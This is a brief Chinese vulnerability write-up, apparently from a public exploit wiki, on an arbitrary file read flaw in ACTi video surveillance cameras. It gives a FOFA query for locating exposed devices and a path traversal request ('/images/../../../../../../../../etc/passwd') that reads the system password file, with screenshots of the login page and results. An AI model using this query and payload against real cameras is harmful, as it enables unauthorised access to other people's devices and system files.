# ACTI 视频监控 任意文件读取漏洞

## 漏洞描述

ACTI 视频监控 存在任意文件读取漏洞

## 漏洞影响

> [!NOTE]
>
> ACTI摄像头

## FOFA

> [!NOTE]
>
> app="ACTi-视频监控"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/ac-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

使用Burp抓包

```
/images/../../../../../../../../etc/passwd
```

![](http://wikioss.peiqi.tech/vuln/ac-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## Goby & POC

![](http://wikioss.peiqi.tech/vuln/ac-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)